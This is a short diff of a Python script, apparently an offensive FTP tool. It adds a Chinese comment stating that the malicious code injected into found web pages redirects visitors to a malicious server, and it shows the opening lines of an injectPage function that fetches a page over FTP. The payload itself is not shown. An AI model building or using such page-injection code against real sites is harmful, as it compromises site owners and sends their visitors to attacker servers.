@@ -57,8 +57,7 @@ def returnDefalut(ftp):
             retList.append(fileName)
     return retList
 #注入恶意代码到搜索到的网页 
-#
-#
+#恶意代码为将访问该网页的流量重定向到恶意服务器
 def injectPage(ftp,page,redirect):
     f = open(page +'.tmp','w')
     ftp.retrlines('RETR ' + page, f.write)
